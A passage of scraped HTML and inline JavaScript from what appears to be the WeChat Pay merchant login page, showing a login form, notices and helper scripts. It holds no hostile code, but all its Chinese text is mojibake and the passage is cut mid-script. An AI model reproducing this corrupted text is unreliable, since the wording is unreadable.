class=""hide"">ÂæÆ‰ø°ÊîØ‰ªò</span>ÂïÜÊà∑ÁôªÂΩï</h2>                     <div class=""tips-warn clr hide"" id=""IDBrowserSafariTips""><i class=""warn""></i><p>Áî±‰∫éSafariÊµèËßàÂô®ÂÆâÂÖ®Á≠ñÁï•ÔºåÂ¶ÇÂØÜÁ†ÅËæìÂÖ•Âá∫Áé∞ÂºÇÂ∏∏ÔºåËØ∑Ê†πÊçÆÊåáÂºï‰øÆÊîπSafariÊµèËßàÂô®ÈÖçÁΩÆÔºå                         <a href=""/help_guide/login_guide.shtml"" target=""_blank"">Êü•ÁúãÊåáÂºï</a></p></div>                     <div class=""tips-warn clr hide"" id=""IDBrowserMacChromeTips""><i class=""warn""></i><p>                         Â¶ÇÂØÜÁ†ÅËæìÂÖ•Âá∫Áé∞ÂºÇÂ∏∏ÔºåËØ∑Ê†πÊçÆÊåáÂºï‰øÆÊîπÊµèËßàÂô®ÈÖçÁΩÆÔºå                         <a href=""https://pay.weixin.qq.com/index.php/public/cms/content_detail?platformType=0&amp;lang=zh&amp;id=29000 "" target=""_blank"">Êü•ÁúãÊåáÂºï„ÄÇ</a></p></div>                       <div class=""tips-error""><i class=""ico-error""></i><p id=""errmsg"" style=""color:red""></p></div>                      <!-- ‰∫§‰∫íËØ¥Êòé                          1. ÁªôÊ†∑Âºè""login-form""Ê∑ªÂä†Ê†∑Âºè""login-account-on"",ÊòæÁ§∫Ë¥¶Âè∑Ëé∑ÁÑ¶ÊïàÊûú                          2. ÁªôÊ†∑Âºè""login-form""Ê∑ªÂä†Ê†∑Âºè""login-password-on"",ÊòæÁ§∫ÂØÜÁ†ÅËé∑ÁÑ¶ÊïàÊûú                     -->                     <form class=""login-form login-password-on"" action=""/index.php/core/home/d_login_transition"" method=""post"">                         <div class=""login-mainly"">                             <div class=""login-account""><label class=""ico-account"" for="""" title=""ÁôªÂΩïÂ∏êÂè∑"">ÁôªÂΩïÂ∏êÂè∑</label><input type=""text"" name=""username"" placeholder=""ÁôªÂΩïÂ∏êÂè∑"" id=""idUserName""></div>                             <div class=""login-password"" id=""mmpayPwdEdit""><label class=""ico-password"" for="""" title=""ÁôªÂΩïÂØÜÁ†Å"">ÁôªÂΩïÂØÜÁ†Å</label><input type=""password"" name=""password"" placeholder=""ÁôªÂΩïÂØÜÁ†Å"" id=""idPassword""></div>                         </div>                          <input type=""hidden"" name=""return_url"" value=""/index.php"">                         <input type=""hidden"" name=""login_type"" value=""0"">                         <input id=""token"" type=""hidden"" name=""ecc_csrf_token"" value=""2a9b085516b87f66cb0ca18a5453bdf4"">                          <div class=""login-verify ""><input type=""text"" name=""checkword_in"" maxlength=""4"" placeholder=""È™åËØÅÁ†Å""><input type=""hidden"" name=""need_check"" value=""1""><img class=""img-verify change-verify"" src=""http://captcha.qq.com/getimage?aid=755049101&amp;rd=0.1314846018794924"" style=""height:40px;width:100px;""><a class=""change-verify"" href=""#"">Êç¢‰∏ÄÂº†</a></div>                     </form>                     <div class=""login-memory""><label id=""memory_username_label"" class=""memory-account"" for=""""><i class=""cbx"" id=""memory_username""></i>ËÆ∞‰ΩèÂ∏êÂè∑</label><a class=""forget-password"" href=""/index.php/public/reset_pass"" onclick=""pgvSendClick({hottag:\'PAY.HOME.LOGIN_BOX.FORGET_PASSWORD\);"">ÂøòËÆ∞ÂØÜÁ†ÅÔºü</a></div>                     <a class=""btn-login"" href=""javascript:void(0);"" id=""do_login"" onclick=""pgvSendClick({hottag:\'PAY.HOME.LOGIN_BOX.LOGIN_BUTTON\);"">ÁôªÂΩï</a>                 </div>             </div>             <input id=""seed"" type=""hidden"" name=""time_seed"" value=""31343839353931393137"">         </div>     </div>  </div> <!-- ÁôªÂΩï ]] -->  <!-- ÂÜÖÂÆπ[[ --> <div class=""container"">     <div class=""wrap"">         <!-- ÊúÄÊñ∞ÂÖ¨Âëä[[ -->         <div class=""cms-notice cms-area clr"" id=""cmsanm_6000"" home=""true"" link-list-id=""6200""><h2>ÊúÄÊñ∞ÂÖ¨Âëä</h2><ul><li><span class=""time"">[03.15]</span><a target=""_blank"" href=""/index.php/public/cms/content_detail?lang=zh&amp;id=36602"" title=""3Êúà16-17Êó•ÂæÆ‰ø°ÊîØ‰ªòÈÄÄÊ¨æ‰∏öÂä°ÂçáÁ∫ßÁª¥Êä§ÈÄöÁü•"">3Êúà16-17Êó•ÂæÆ‰ø°ÊîØ‰ªòÈÄÄÊ¨æ‰∏öÂä°ÂçáÁ∫ßÁª¥Êä§ÈÄöÁü•</a><i class=""ico-new""></i></li><li><span class=""time"">[02.10]</span><a target=""_blank"" href=""/index.php/public/cms/content_detail?lang=zh&amp;id=41201"" title=""ÂæÆ‰ø°ÊîØ‰ªò‰ºÅ‰∏ö‰ªòÊ¨æ‰∏öÂä°Ë∞ÉÊï¥ÂÖ¨Âëä"">ÂæÆ‰ø°ÊîØ‰ªò‰ºÅ‰∏ö‰ªòÊ¨æ‰∏öÂä°Ë∞ÉÊï¥ÂÖ¨Âëä</a></li><li><span class=""time"">[11.30]</span><a target=""_blank"" href=""/index.php/public/cms/content_detail?lang=zh&amp;id=30001"" title=""„ÄäÂïÜÊà∑Âπ≥Âè∞‰ΩøÁî®ÊâãÂÜå„ÄãÊ≠£Âºè‰∏äÁ∫ø"">„ÄäÂïÜÊà∑Âπ≥Âè∞‰ΩøÁî®ÊâãÂÜå„ÄãÊ≠£Âºè‰∏äÁ∫ø</a></li></ul><p class=""more""><a href=""/public/cms/content_list?lang=zh&amp;id=6200"" target=""_blank"">Êõ¥Â§öÂÖ¨Âëä&gt;&gt;</a></p></div>         <!-- ÊúÄÊñ∞ÂÖ¨Âëä ]] -->          <!-- ÂõõÂ§ßÊîØ‰ªòÊñπÂºè[[ -->         <div class=""title clr"">             <h2>Êé•ÂÖ•ÂæÆ‰ø°ÊîØ‰ªò</h2>         </div>         <div class=""function clr"">             <ul class=""guide-main clr"">                 <li class=""guide-main-li-1"">                     <a href=""http://kf.qq.com/faq/120911VrYVrA150905zeYjMZ.html"" target=""_blank"" onclick=""pgvSendClick({hottag:\'PAY.HOME.APPLY.IN_APP_WEB\);"">                         <span class=""guide-main-li-ico ico-mp""></span>                         <h3 class=""title"">ÂÖ¨‰ºóÂè∑ÊîØ‰ªò</h3>                         <p class=""info"">Âú®ÂæÆ‰ø°ÂÜÖÁöÑÂïÜÂÆ∂È°µÈù¢‰∏äÂÆåÊàê<em>ÂÖ¨‰ºóÂè∑ÊîØ‰ªò</em></p>                         <span class=""btngreen"">ÊàëË¶ÅÊé•ÂÖ•</span>                     </a>                 </li>                 <li class=""guide-main-li-2"">                     <a href=""http://kf.qq.com/faq/120911VrYVrA150906F3qqY3.html"" target=""_blank"" onclick=""pgvSendClick({hottag:\'PAY.HOME.APPLY.IN_APP\);"">                         <span class=""guide-main-li-ico ico-app""></span>                         <h3 class=""title"">APPÊîØ‰ªò</h3>                         <p class=""info"">Âú®APP‰∏≠ÔºåË∞ÉËµ∑ÂæÆ‰ø°ËøõË°å<em>APPÊîØ‰ªò</em></p>                         <span class=""btngreen"">ÊàëË¶ÅÊé•ÂÖ•</span>                     </a>                 </li>                 <li class=""guide-main-li-3"">                     <a href=""http://kf.qq.com/faq/120911VrYVrA150906yUZze6.html"" target=""_blank"" onclick=""pgvSendClick({hottag:\'PAY.HOME.APPLY.QR_CODE\);"">                         <span class=""guide-main-li-ico ico-code""></span>                         <h3 class=""title"">Êâ´Á†ÅÊîØ‰ªò</h3>                         <p class=""info"">Êâ´Êèè‰∫åÁª¥Á†ÅËøõË°å<em>Êâ´Á†ÅÊîØ‰ªò</em></p>                         <span class=""btngreen"">ÊàëË¶ÅÊé•ÂÖ•</span>                     </a>                 </li>                 <li class=""guide-main-li-4"">                     <a href=""http://kf.qq.com/faq/120911VrYVrA150906iQjQjI.html"" target=""_blank"" onclick=""pgvSendClick({hottag:\'PAY.HOME.APPLY.QUICK_PAY\);"">                         <span class=""guide-main-li-ico ico-shuaka""></span>                         <h3 class=""title"">Âà∑Âç°ÊîØ‰ªò</h3>                         <p class=""info"">Áî®Êà∑Â±ïÁ§∫Êù°Á†ÅÔºåÂïÜÊà∑Êâ´ÊèèÂÆåÊàê<em>Âà∑Âç°ÊîØ‰ªò</em></p>                         <span class=""btngreen"">ÊàëË¶ÅÊé•ÂÖ•</span>                     </a>                 </li>             </ul>         </div>         <!-- ÂõõÂ§ßÊîØ‰ªòÊñπÂºè ]] -->          <!-- ÂæÆ‰ø°ÊîØ‰ªòÂïÜÊà∑ÈÄö[[ -->         <div class=""title clr"">             <h2>ÂæÆ‰ø°ÊîØ‰ªòÂïÜÊà∑ÈÄö</h2>         </div>         <div class=""through"">             <ul>                 <li class=""l01"">Â¶Ç‰ΩïÂø´ÈÄüÊé•ÂÖ•<strong>ÂæÆ‰ø°ÊîØ‰ªò</strong>Ôºü</li>                 <li class=""l02"">‰∫ÜËß£ÊúÄÊñ∞ÁöÑ<strong>ÊîØ‰ªòÊäÄÊúØÊé•Âè£</strong>Ôºü</li>                 <li class=""l03""><strong>ÂæÆ‰ø°ÂïÜÊà∑</strong>ÂêéÂè∞Êìç‰ΩúÊúâÁñëÈóÆÔºü</li>                 <li class=""l04""><strong>ÂæÆ‰ø°Áé∞ÈáëÁ∫¢ÂåÖ</strong>ÊÄé‰πàÁé©Ôºü</li>                 <li class=""l05"">ÊéåÊè°ÊúÄÊñ∞ÁöÑ<strong>ÂæÆ‰ø°Ë°å‰∏öËß£ÂÜ≥ÊñπÊ°à</strong>Ôºü</li>                 <li class=""l06"">Ëé∑Âèñ‰∏ÄÊâãÁöÑ<strong>ÂæÆ‰ø°ÊîØ‰ªòÂÆòÊñπÂä®ÊÄÅ</strong>Ôºü</li>             </ul>         </div>         <!-- ÂæÆ‰ø°ÊîØ‰ªòÂïÜÊà∑ÈÄö ]] -->     </div> </div> <!-- ÂÜÖÂÆπ ]] -->  <script src=""https://www.tenpay.com/v2/res/js/global/tenpayctrl_v2-min.js""></script> <script>window[""MCH.tenpaycertV2.time""]=[new Date()]</script> <script id=""legos:22410"" ver=""22410:20151023:20170106102318"" name=""MCH.tenpaycertV2"" src=""https://wx.gtimg.com/mch/js/ver/2015/10/mch.tenpaycertV2.20151023.js?t=20170106102318"" charset=""utf-8""></script><!--[if !IE]>|xGv00|09219d01d9d2312179afd1ffbb55230b<![endif]--><!--[if !IE]>|xGv00|8ab59df4495293a71573934cfa4d640c<![endif]--> <script>window[""MCH.home.time""]=[new Date()]</script> <script id=""legos:22134"" ver=""22134:20140516:20170105201629"" name=""MCH.home"" charset=""utf-8"">     window[\'MCH.home.time\'] && window[\'MCH.home.time\'].push(new Date());     function $addToken(url,type,skey){var token=$getToken(skey);if(url==""""||(url.indexOf(""://"")<0?location.href:url).indexOf(""http"")!=0){return url;}         if(url.indexOf(""#"")!=-1){var f1=url.match(/\\?.+\\#/);if(f1){var t=f1[0].split(""#""),newPara=[t[0],""&g_tk="",token,""&g_ty="",type,""#"",t[1]].join("""");return url.replace(f1[0],newPara);}else{var t=url.split(""#"");return[t[0],""?g_tk="",token,""&g_ty="",type,""#"",t[1]].join("""");}}         return token==""""?(url+(url.indexOf(""?"")!=-1?""&"":""?"")+""g_ty=""+type):(url+(url.indexOf(""?"")!=-1?""&"":""?"")+""g_tk=""+token+""&g_ty=""+type);};var $ajax=(function(window,undefined){var oXHRCallbacks,xhrCounter=0;var fXHRAbortOnUnload=window.ActiveXObject?function(){for(var key in oXHRCallbacks){oXHRCallbacks[key](0,1);}}:false;return function(opt){var o={url:\'\',method:\'GET\',data:null,type:""text"",async:true,cache:false,timeout:0,autoToken:true,username:\'\',password:\'\',beforeSend:$empty(),onSuccess:$empty(),onError:$empty(),onComplete:$empty()};for(var key in opt){o[key]=opt[key]}         var callback,timeoutTimer,xhrCallbackHandle,ajaxLocation,ajaxLocParts;try{ajaxLocation=location.href;}         catch(e){ajaxLocation=document.createElement(""a"");ajaxLocation.href="""";ajaxLocation=ajaxLocation.href;}         ajaxLocParts=/^([\\w\\+\\.\\-]+:)(?:\\/\\/([^\\/?#:]*)(?::(\\d+)|)|)/.exec(ajaxLocation.toLowerCase())||[];o.isLocal=/^(?:about|app|app\\-storage|.+\\-extension|file|res|widget):$/.test(ajaxLocParts[1]);o.method=(typeof(o.method)!=""string""||o.method.toUpperCase()!=""POST"")?""GET"":""POST"";o.data=(typeof o.data==""string"")?o.data:$makeUrl(o.data);if(o.method==\'GET\'&&o.data){o.url+=(o.url.indexOf(""?"")<0?""?"":""&"")+o.data;}         if(o.autoToken){o.url=$addToken(o.url,""ajax"");}         o.xhr=$xhrMaker();if(o.xhr===null){return false;}         try{if(o.username){o.xhr.open(o.method,o.url,o.async,o.username,o.password);}         else{o.xhr.open(o.method,o.url,o.async);}}         catch(e){o.onError(-2,e);return false;}         if(o.method==\'POST\'){o.xhr.setRequestHeader(\'Content-Type\',\'application/x-www-form-urlencoded\');}         if(!o.cache){o.xhr.setRequestHeader(\'If-Modified-Since\',\'Thu, 1 Jan 1970 00:00:00 GMT\');o.xhr.setRequestHeader(\'Cache-Control\',\'no-cache\');}         o.beforeSend(o.xhr);if(o.async&&o.timeout>0){if(o.xhr.timeout===undefined){timeoutTimer=setTimeout(function(){if(o.xhr&&callback){callback(0,1);}             o.onError(0,null,\'timeout\');},o.timeout);}         else{o.xhr.timeout=o.timeout;o.xhr.ontimeout=function(){if(o.xhr&&callback){callback(0,1);}             o.onError(0,null,\'timeout\');};}}         o.xhr.send(o.method==\'POST\'?o.data:null);callback=function(e,isAbort){if(timeoutTimer){clearTimeout(timeoutTimer);timeoutTimer=undefined;}             if(callback&&(isAbort||o.xhr.readyState===4)){callback=undefined;if(xhrCallbackHandle){o.xhr.onreadystatechange=$empty();if(fXHRAbortOnUnload){try{delete oXHRCallbacks[xhrCallbackHandle];}             catch(e){}}}                 if(isAbort){if(o.xhr.readyState!==4){o.xhr.abort();}}                 else{var status,statusText,responses;responses={headers:o.xhr.getAllResponseHeaders()};status=o.xhr.status;try{statusText=o.xhr.statusText;}                 catch(e){statusText="""";}                     try{responses.text=o.xhr.responseText;}                     catch(e){responses.text="""";}                     if(!status&&o.isLocal){status=responses.text?200:404;}                     else if(status===1223){status=204;}                     if(status>=200&&status<300){responses.text=responses.text.replace(/<!--\\[if !IE\\]>[\\w\\|]+<!\\[endif\\]-->/g,\'\');switch(o.type){case\'text\':o.onSuccess(responses.text);break;case""json"":var json;try{json=(new Function(""return (""+responses.text+"")""))();}                     catch(e){o.onError(status,e,responses.text);}                         if(json){o.onSuccess(json);}                         break;case""xml"":o.onSuccess(o.xhr.responseXML);break;}}                     else{if(status===0&&o.timeout>0){o.onError(status,null,\'timeout\');}                     else{o.onError(status,null,statusText);}}                     o.onComplete(status,statusText,responses);}                 delete o.xhr;}};if(!o.async){callback();}         else if(o.xhr.readyState===4){setTimeout(callback,0);}         else{xhrCallbackHandle=++xhrCounter;if(fXHRAbortOnUnload){if(!oXHRCallbacks){oXHRCallbacks={};if(window.attachEvent){window.attachEvent(""onunload"",fXHRAbortOnUnload);}         else{window[""onunload""]=fXHRAbortOnUnload;}}             oXHRCallbacks[xhrCallbackHandle]=callback;}             o.xhr.onreadystatechange=callback;}};})(window,undefined);function $empty(){return function(){return true;}};function $getCookie(name){var reg=new RegExp(""(^| )""+name+""(?:=([^;]*))?(;|$)""),val=document.cookie.match(reg);return val?(val[2]?unescape(val[2]):""""):null;};function $getToken(skey){var skey=skey?skey:$getCookie(""skey"");return skey?$time33(skey):"""";};function $makeUrl(data){var arr=[];for(var k in data){arr.push(k+""=""+data[k]);};return arr.join(""&"");};function $namespace(name){for(var arr=name.split(\',\'),r=0,len=arr.length;r<len;r++){for(var i=0,k,name=arr[r].split(\'.\'),parent={};k=name[i];i++){i===0?eval(\'(typeof \'+k+\')===""undefined""?(\'+k+\'={}):"""";parent=\'+k):(parent=parent[k]=parent[k]||{});}}};function $setCookie(name,value,expires,path,domain,secure){var exp=new Date(),expires=arguments[2]||null,path=arguments[3]||""/"",domain=arguments[4]||null,secure=arguments[5]||false;expires?exp.setMinutes(exp.getMinutes()+parseInt(expires)):"""";document.cookie=name+\'=\'+escape(value)+(expires?\';expires=\'+exp.toGMTString():\'\')+(path?\';path=\'+path:\'\')+(domain?\';domain=\'+domain:\'\')+(secure?\';secure\':\'\');};function $strTrim(str,code){var argus=code||""\\\\s"";var temp=new RegExp(""(^""+argus+""*)|(""+argus+""*$)"",""g"");return str.replace(temp,"""");};function $time33(str){for(var i=0,len=str.length,hash=5381;i<len;++i){hash+=(hash<<5)+str.charAt(i).charCodeAt();};return hash&0x7fffffff;};function $xhrMaker(){var xhr;try{xhr=new XMLHttpRequest();}catch(e){try{xhr=new ActiveXObject(""Msxml2.XMLHTTP"");}catch(e){try{xhr=new ActiveXObject(""Microsoft.XMLHTTP"");}catch(e){xhr=null;}}};return xhr;};$namespace(""MCH.home"");MCH.home={tenpayEdit:\'\;MCH.home.init=function(){homeThat=this;homeThat.tenpayEdit=new MCH.mmpayEdit({bindObjId:""mmpayPwdEdit"",width:258,height:44},{isShowFunc:MCH.home.isShowFunc,returnCallBack:MCH.home.editShowReturn},this);this.bind();Common.exdAttrBrowser();};MCH.home.isShowFunc=function(){var username=$strTrim($("".login-form"").find(""input[name=username]"").val());if(Common.isTenpayMchByName(username)){return true;}else{return false;}};MCH.home.editShowReturn=function(editRet){var browserFunc=function(){var sys=Common.getBrowserVersion();if(sys.osType==""mac""&&sys.browserName==""Safari""){$(""#IDBrowserSafariTips"").removeClass(""hide"");}else if(sys.osType==""mac""&&sys.browserName==""Chrome""&&sys.browserVersion>=""47""){$(""#IDBrowserMacChromeTips"").removeClass(""hide"");}else if(sys.osType==""windows""&&sys.browserName!=""IE""){$(""#IDBrowserMacChromeTips"").removeClass(""hide"");}};try{var version=editRet.editObj.ctrl.Version.toString();if(version&&(version>1206)){return true;}else{browserFunc();}}catch(e){browserFunc();}};MCH.home.focus_fuc=function(){$("".login-form"").removeClass(""login-account-on"");$("".login-form"").addClass(""login-password-on"");};MCH.home.blur_fuc=function(){$("".login-form"").removeClass(""login-password-on"");};MCH.home.enter_fuc=function(){return null;};MCH.home.ossAttrIncAPI=function(id,key){var postData=\'id=\'+id+\'&key=\'+key;$ajax({url:\'/webreport/ossattrapi\',data:postData,method:\'post\',type:\'json\',async:true,onSuccess:function(data){},onError:function(msg){}});};MCH.home.userNameBlur=function(){var username=$("".login-form"").find(""input[name=username]"").val();var length=username.length;switch(length){case 0:MCH.home.ossAttrIncAPI(63769,18);break;case 1:MCH.home.ossAttrIncAPI(63769,19);break;case 2:MCH.home.ossAttrIncAPI(63769,20);break;case 3:MCH.home.ossAttrIncAPI(63769,21);break;case 4:MCH.home.ossAttrIncAPI(63769,22);break;case 5:MCH.home.ossAttrIncAPI(63769,23);break;case 6:MCH.home.ossAttrIncAPI(63769,24);break;case 7:MCH.home.ossAttrIncAPI(63769,25);break;case 8:MCH.home.ossAttrIncAPI(63769,26);break;case 9:MCH.home.ossAttrIncAPI(63769,27);break;case 10:MCH.home.ossAttrIncAPI(63769,28);break;default:MCH.home.ossAttrIncAPI(63769,29);break;}         var ua=navigator.userAgent.toLowerCase();var reg=/[Aa]ndroid/;if(reg.test(ua)){MCH.home.ossAttrIncAPI(63769,31);}else{MCH.home.ossAttrIncAPI(63769,32);}};MCH.home.bind=function(){$(""input[name=username]"").focus();if($getCookie(""username"")){MCH.home.ossAttrIncAPI(63769,30);$(""input[name=username]"").val($getCookie(""username""));$(""#memory_username"").addClass(\'cbx-on\');}         $(""input[name=username]"").on(\'focus\',function(){MCH.home.ossAttrIncAPI(63769,17);$("".login-form"").removeClass(""login-password-on"");$("".login-form"").addClass(""login-account-on"");});$(""input[name=password]"").on(\'focus\',function(){$("".login-form"").removeClass(""login-account-on"");$("".login-form"").addClass(""login-password-on"");homeThat.tenpayEdit.show();});$(""input[name=username]"").on(\'blur\',function(){MCH.home.userNameBlur();$("".login-form"").removeClass(""login-account-on"");$("".login-form"").addClass(""login-password-on"");homeThat.tenpayEdit.show();});$(""#memory_username_label"").on(\'click\',function(){if($(\'#memory_username\').hasClass(\'cbx-on\')){$(\'#memory_username\').removeClass(\'cbx-on\');}else{$(\'#memory_username\').addClass(\'cbx-on\');}});$(""#do_login"").on(\'click\',function(){$(""#errmsg"").text("""").addClass(\'hide\');var temp_usrname=$("".login-form"").find(""input[name=username]"").val();$("".login-form"").find(""input[name=username]"").val($strTrim(temp_usrname));if($(""#memory_username"").hasClass(\'cbx-on\')){$setCookie(\'username\',$(""input[name=username]"").val(),\'3600\');}else{$setCookie(\'username\',$(""input[name=username]"").val());}             var username=$("".login-form"").find(""input[name=username]"").val();var password=$("".login-form"").find(""input[name=password]"").val();password=homeThat.tenpayEdit.getPwd();if(username&&password){password=Common.encryptPassword(password);if($("".login-verify"").html()){if($(""input[name=checkword_in]"").val()){if($(""input[name=checkword_in]"").val().length!=4){$(""#errmsg"").text(\'ËØ∑Ê£ÄÊü•È™åËØÅÁ†Å\').removeClass(\'hide\');}else{$("".login-form"").find(""input[name=password]"").val(password);$("".login-form"").submit();}}             else{$(""#errmsg"").text(\'ËØ∑ËæìÂÖ•È™åËØÅÁ†Å\').removeClass(\'hide\');}}else{$("".login-form"").find(""input[name=password]"").val(password);$("".login-form"").submit();}}else{if(username.length==0&&password===false){$(""#errmsg"").text(\'ËØ∑ËæìÂÖ•Â∏êÂè∑ÂíåÂØÜÁ†Å\').removeClass(\'hide\');}else if(username.length==0){$(""#errmsg"").text(\'ËØ∑ËæìÂÖ•ÁôªÂΩïÂ∏êÂè∑\').removeClass(\'hide\');}else{$(""#errmsg"").text(homeThat.tenpayEdit.errmsg).removeClass(\'hide\');}}});};MCH.home.init();     window[\'MCH.home\']=\'22134:20140516:20170105201629\';     window[\'MCH.home.time\'] && window[\'MCH.home.time\'].push(new Date()); </script><!--[if !IE]>|xGv00|6f5e5c77fe153f6e42ad173204c021c5<![endif]--> <script>window[""MCH.cms.time""]=[new Date()]</script> <script id=""legos:22392"" ver=""22392:20151027:20160810123858"" name=""MCH.cms"" src=""https://wx.gtimg.com/mch/js/ver/2015/10/mch.cms.20151027.js?t=20160810123858"" charset=""utf-8""></script><!--[if !IE]>|xGv00|b299de016a6e1f795625ccbc51c6c029<![endif]-->  <!-- Â∫ïÈÉ®[[ --> <div class=""footer"">     <div class=""wrap"">         <p>             <a target=""_blank"" href=""http://help.tenpay.com/cgi-bin/helpcenter/help_center.cgi?id=1&amp;type=0"">ÂÖ≥‰∫éË¥¢‰ªòÈÄö</a>             <i class=""vs"">|</i>             <a target=""_blank"" href=""https://pay.weixin.qq.com/index.php/core/home/pay_pact_v4"">Âπ≥Âè∞‰ΩøÁî®ÂçèËÆÆ</a>             <i class=""vs"">|</i>             <a href=""https://pay.weixin.qq.com/index.php/public/apply_sign/protocol_v2"" target=""_blank"">ÊîØ‰ªòÊúçÂä°ÂçèËÆÆ</a>             <i class=""vs"">|</i>             Powered By Tencent &amp; Tenpay\u3000Copyright¬© 2005-<script>             var year="""";             mydate=new Date();             myyear=mydate.getYear();             year=(myyear > 200) ? myyear : 1900 + myyear;             document.write(year);         </script>2017 Tenpay All Rights Reserved.         </p>         <p>             <a target=""_blank"" href=""http://weixin.qq.com/"">ÂæÆ‰ø°</a>             <i class=""vs"">|</i>             <a target=""_blank"" href=""https://mp.weixin.qq.com/"">ÂæÆ‰ø°ÂÖ¨‰ºóÂπ≥Âè∞</a>             <i class=""vs"">|</i>             <a target=""_blank"" href=""https://open.weixin.qq.com/"">ÂæÆ‰ø°ÂºÄÊîæÂπ≥Âè∞</a>             <i class=""vs"">|</i>             <a target=""_blank"" href=""http://e.qq.com/"">ÂπøÁÇπÈÄö</a>             <i class=""vs"">|</i>             <a target=""_blank"" href=""http://open.qq.com/"">ËÖæËÆØÂºÄÊîæÂπ≥Âè∞</a>         </p>     </div> </div> <script type=""text/javascript"">if(typeof $jqueryUi == ""undefined""){document.write(\'<script type=""text/javascript"" src=""https://wx.gtimg.com/third/jquery/jquery-ui.js""></script""+"">\');}</script><script type=""text/javascript"" src=""https://wx.gtimg.com/third/jquery/jquery-ui.js""></script""+""> <script>window[""MCH.footer.time""]=[new Date()]</script> <script id=""legos:22125"" ver=""22125:20140422:20161206161027"" name=""MCH.footer"" charset=""utf-8"">     window[\'MCH.footer.time\'] && window[\'MCH.footer.time\'].push(new Date());     function $addToken(url,type,skey){var token=$getToken(skey);if(url==""""||(url.indexOf(""://"")<0?location.href:url).indexOf(""http"")!=0){return url;}         if(url.indexOf(""#"")!=-1){var f1=url.match(/\\?.+\\#/);if(f1){var t=f1[0].split(""#""),newPara=[t[0],""&g_tk="",token,""&g_ty="",type,""#"",t[1]].join("""");return url.replace(f1[0],newPara);}else{var t=url.split(""#"");return[t[0],""?g_tk="",token,""&g_ty="",type,""#"",t[1]].join("""");}}         return token==""""?(url+(url.indexOf(""?"")!=-1?""&"":""?"")+""g_ty=""+type):(url+(url.indexOf(""?"")!=-1?""&"":""?"")+""g_tk=""+token+""&g_ty=""+type);};var $ajax=(function(window,undefined){var oXHRCallbacks,xhrCounter=0;var fXHRAbortOnUnload=window.ActiveXObject?function(){for(var key in oXHRCallbacks){oXHRCallbacks[key](0,1);}}:false;return function(opt){var o={url:\'\',method:\'GET\',data:null,type:""text"",async:true,cache:false,timeout:0,autoToken:true,username:\'\',password:\'\',beforeSend:$empty(),onSuccess:$empty(),onError:$empty(),onComplete:$empty()};for(var key in opt){o[key]=opt[key]}         var callback,timeoutTimer,xhrCallbackHandle,ajaxLocation,ajaxLocParts;try{ajaxLocation=location.href;}         catch(e){ajaxLocation=document.createElement(""a"");ajaxLocation.href="""";ajaxLocation=ajaxLocation.href;}         ajaxLocParts=/^([\\w\\+\\.\\-]+:)(?:\\/\\/([^\\/?#:]*)(?::(\\d+)|)|)/.exec(ajaxLocation.toLowerCase())||[];o.isLocal=/^(?:about|app|app\\-storage|.+\\-extension|file|res|widget):$/.test(ajaxLocParts[1]);o.method=(typeof(o.method)!=""string""||o.method.toUpperCase()!=""POST"")?""GET"":""POST"";o.data=(typeof o.data==""string"")?o.data:$makeUrl(o.data);if(o.method==\'GET\'&&o.data){o.url+=(o.url.indexOf(""?"")<0?""?"":""&"")+o.data;}         if(o.autoToken){o.url=$addToken(o.url,""ajax"");}         o.xhr=$xhrMaker();if(o.xhr===null){return false;}         try{if(o.username){o.xhr.open(o.method,o.url,o.async,o.username,o.password);}         else{o.xhr.open(o.method,o.url,o.async);}}         catch(e){o.onError(-2,e);return false;}         if(o.method==\'POST\'){o.xhr.setRequestHeader(\'Content-Type\',\'application/x-www-form-urlencoded\');}         if(!o.cache){o.xhr.setRequestHeader(\'If-Modified-Since\',\'Thu, 1 Jan 1970 00:00:00 GMT\');o.xhr.setRequestHeader(\'Cache-Control\',\'no-cache\');}         o.beforeSend(o.xhr);if(o.async&&o.timeout>0){if(o.xhr.timeout===undefined){timeoutTimer=setTimeout(function(){if(o.xhr&&callback){callback(0,1);}             o.onError(0,null,\'timeout\');},o.timeout);}         else{o.xhr.timeout=o.timeout;o.xhr.ontimeout=function(){if(o.xhr&&callback){callback(0,1);}             o.onError(0,null,\'timeout\');};}}         o.xhr.send(o.method==\'POST\'?o.data:null);callback=function(e,isAbort){if(timeoutTimer){clearTimeout(timeoutTimer);timeoutTimer=undefined;}             if(callback&&(isAbort||o.xhr.readyState===4)){callback=undefined;if(xhrCallbackHandle){o.xhr.onreadystatechange=$empty();if(fXHRAbortOnUnload){try{delete oXHRCallbacks[xhrCallbackHandle];}             catch(e){}}}                 if(isAbort){if(o.xhr.readyState!==4){o.xhr.abort();}}                 else{var status,statusText,responses;responses={headers:o.xhr.getAllResponseHeaders()};status=o.xhr.status;try{statusText=o.xhr.statusText;}                 catch(e){statusText="""";}                     try{responses.text=o.xhr.responseText;}                     catch(e){responses.text="""";}                     if(!status&&o.isLocal){status=responses.text?200:404;}                     else if(status===1223){status=204;}                     if(status>=200&&status<300){responses.text=responses.text.replace(/<!--\\[if !IE\\]>[\\w\\|]+<!\\[endif\\]-->/g,\'\');switch(o.type){case\'text\':o.onSuccess(responses.text);break;case""json"":var json;try{json=(new Function(""return (""+responses.text+"")""))();}                     catch(e){o.onError(status,e,responses.text);}                         if(json){o.onSuccess(json);}                         break;case""xml"":o.onSuccess(o.xhr.responseXML);break;}}                     else{if(status===0&&o.timeout>0){o.onError(status,null,\'timeout\');}                     else{o.onError(status,null,statusText);}}                     o.onComplete(status,statusText,responses);}                 delete o.xhr;}};if(!o.async){callback();}         else if(o.xhr.readyState===4){setTimeout(callback,0);}         else{xhrCallbackHandle=++xhrCounter;if(fXHRAbortOnUnload){if(!oXHRCallbacks){oXHRCallbacks={};if(window.attachEvent){window.attachEvent(""onunload"",fXHRAbortOnUnload);}         else{window[""onunload""]=fXHRAbortOnUnload;}}             oXHRCallbacks[xhrCallbackHandle]=callback;}             o.xhr.onreadystatechange=callback;}};})(window,undefined);function $empty(){return function(){return true;}};function $getCookie(name){var reg=new RegExp(""(^| )""+name+""(?:=([^;]*))?(;|$)""),val=document.cookie.match(reg);return val?(val[2]?unescape(val[2]):""""):null;};function $getToken(skey){var skey=skey?skey:$getCookie(""skey"");return skey?$time33(skey):"""";};function $makeUrl(data){var arr=[];for(var k in data){arr.push(k+""=""+data[k]);};return arr.join(""&"");};function $namespace(name){for(var arr=name.split(\',\'),r=0,len=arr.length;r<len;r++){for(var i=0,k,name=arr[r].split(\'.\'),parent={};k=name[i];i++){i===0?eval(\'(typeof \'+k+\')===""undefined""?(\'+k+\'={}):"""";parent=\'+k):(parent=parent[k]=parent[k]||{});}}};function $time33(str){for(var 